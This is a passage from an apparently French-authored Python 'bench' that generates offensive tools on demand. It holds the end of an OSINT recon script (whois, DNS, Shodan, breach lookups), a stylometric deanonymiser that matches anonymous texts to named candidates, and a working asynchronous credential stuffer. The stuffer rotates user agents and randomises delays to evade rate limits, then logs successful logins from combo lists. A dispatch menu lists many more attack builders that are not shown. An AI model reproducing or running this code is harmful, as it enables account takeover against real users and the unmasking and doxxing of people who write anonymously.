            is_ip=all(c.isdigit() or c=="." for c in target)
            if not is_ip:
                report["whois"]=whois(target); report["dns"]=dns(target)
                try:
                    ip=socket.gethostbyname(target)
                    report["ip"]=ip; report["shodan"]=shodan(ip); report["reverse"]=reverse_ip(ip)
                except Exception: pass
            else: report["shodan"]=shodan(target); report["reverse"]=reverse_ip(target)
            if "@" in target: report["hibp"]=hibp(target)
            return report

        if __name__=="__main__":
            t=input("Cible (IP/domaine/email): ").strip()
            r=run(t)
            out=Path(f"output/osint_{t.replace('.','_').replace('@','_at_')}.json")
            out.write_text(json.dumps(r,indent=2,ensure_ascii=False))
            print(f"[+] → {out}")
            print(json.dumps(r,indent=2,ensure_ascii=False))
    '''
    write_file(name, code)

def build_moires():
    name = ask("output [moires.py]: ", "moires.py")
    code = '''\
        # Deanonymiseur stylométrique — fingerprint + cosine similarity
        import re,math
        from collections import Counter

        def features(text):
            words=re.findall(r'\\b\\w+\\b',text.lower())
            sents=[s.strip() for s in re.split(r'[.!?]+',text) if s.strip()]
            fw=["je","tu","il","elle","nous","vous","les","de","et","ou","the","and","of","to","is"]
            fw_c={w:words.count(w) for w in fw}; fwt=max(sum(fw_c.values()),1)
            bg=Counter(text[i:i+2] for i in range(len(text)-1) if text[i:i+2].strip())
            return {
                "awl":round(sum(len(w) for w in words)/max(len(words),1),3),
                "asl":round(sum(len(s.split()) for s in sents)/max(len(sents),1),3),
                "ttr":round(len(set(words))/max(len(words),1),3),
                "pct":round(len(re.findall(r'[,;:!?]',text))/max(len(text),1),4),
                **{f"fw_{k}":round(v/fwt,4) for k,v in fw_c.items()},
                **{f"bg_{k}":v for k,v in bg.most_common(15)},
            }

        def cosine(a,b):
            keys=set(a)&set(b)
            fa=[a.get(k,0) for k in keys]; fb=[b.get(k,0) for k in keys]
            dot=sum(x*y for x,y in zip(fa,fb))
            na=math.sqrt(sum(x**2 for x in fa)); nb=math.sqrt(sum(x**2 for x in fb))
            return round(dot/(na*nb),4) if na and nb else 0.0

        def identify(unknown,candidates):
            uf=features(unknown)
            return sorted([{"name":n,"sim":cosine(uf,features(t))} for n,t in candidates.items()],
                key=lambda x:x["sim"],reverse=True)

        if __name__=="__main__":
            unk=input("Texte inconnu (entrée libre): ")
            n=int(input("Nb candidats [2]: ") or "2")
            cands={}
            for i in range(n):
                name=input(f"Nom candidat {i+1}: ")
                text=input(f"Texte candidat {i+1}: ")
                cands[name]=text
            res=identify(unk,cands)
            for r in res: print(f"  {r['name']:20} sim: {r['sim']}")
            print(f"→ plus probable: {res[0]['name']}")
    '''
    write_file(name, code)

def build_heracles():
    name = ask("output [heracles.py]: ", "heracles.py")
    code = '''\
        # Credential stuffer async — rate-limit aware, rotating UA
        # deps: aiohttp
        import asyncio,aiohttp,json,random
        from pathlib import Path

        UA=[
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/115.0",
        ]
        TARGET     = "https://FILL_TARGET/login"       # FILL
        POST_PARAMS = lambda u,p: {"username":u,"password":p}  # FILL si nécessaire
        SUCCESS_SIG = "dashboard"
        DELAY_MIN,DELAY_MAX = 1.5,4.0
        CONCURRENCY = 3

        async def try_login(session,user,pw,sem):
            async with sem:
                try:
                    async with session.post(TARGET,data=POST_PARAMS(user,pw),
                        headers={"User-Agent":random.choice(UA)},
                        allow_redirects=True,
                        timeout=aiohttp.ClientTimeout(total=10)) as r:
                        body=await r.text()
                        return {"user":user,"pass":pw,"status":r.status,
                                "success":SUCCESS_SIG.lower() in body.lower()}
                except Exception as e:
                    return {"user":user,"pass":pw,"error":str(e),"success":False}
                finally:
                    await asyncio.sleep(random.uniform(DELAY_MIN,DELAY_MAX))

        async def run(combo_file,out_file):
            combos=[(l.split(":",1)[0].strip(),l.split(":",1)[1].strip())
                    for l in Path(combo_file).read_text().splitlines() if ":" in l]
            print(f"[+] {len(combos)} combos")
            hits=[]; sem=asyncio.Semaphore(CONCURRENCY)
            async with aiohttp.ClientSession() as sess:
                for i,coro in enumerate(asyncio.as_completed(
                    [try_login(sess,u,p,sem) for u,p in combos])):
                    r=await coro
                    if r.get("success"): print(f"[HIT] {r['user']}:{r['pass']}"); hits.append(r)
                    else: print(f"[{i+1}/{len(combos)}] {r['user']} fail")
            Path(out_file).write_text(json.dumps(hits,indent=2))
            print(f"[+] {len(hits)} hits → {out_file}")

        if __name__=="__main__":
            cf=input("Combos [combos.txt]: ") or "combos.txt"
            of=input("Output [output/hits.json]: ") or "output/hits.json"
            asyncio.run(run(cf,of))
    '''
    write_file(name, code)

# ══════════════════════════════════════════════
# CAT 4 + 6 — moteurs locaux (zéro API) — dans ares_cat46.py
from ares_cat46 import build_erinyes, build_aphrodite, build_sibylle, build_icare, build_athena, build_pygmalion, build_muses

DISPATCH = {
    "11": build_proteus,  "12": build_dedale,    "13": build_sphinx,
    "14": build_hades,    "15": build_hermes,    "16": build_argos,
    "17": build_prometheus,"18": build_charon,   "19": build_atlas,
    "1A": build_kerberos, "1B": build_hydra,
    "21": build_metis,    "22": build_syrenes,   "23": build_chimera,
    "24": build_echo,
    "31": build_panoptes, "32": build_moires,    "33": build_heracles,
    "41": build_erinyes,  "42": build_aphrodite, "43": build_sibylle,
    "61": build_icare,    "62": build_athena,    "63": build_pygmalion,
    "64": build_muses,
}

def main():
    print(Fore.RED + BANNER + Style.RESET_ALL)
    while True:
        print(MENU)
        choice = input(Fore.YELLOW + "bench> " + Style.RESET_ALL).strip().upper()
        if choice == "0":
            print(Fore.RED + "[-] bench closed.")
            break
        fn = DISPATCH.get(choice)
        if fn:
            fn()
        else:
            print(Fore.RED + "[!] invalid — essaie 11, 12, ... 1A, 1B, 21, ...")

if __name__ == "__main__":
    try:
        import mythos; mythos.intro()
    except Exception as e:
        pass  # le mythe ne bloque jamais la guerre
    main()
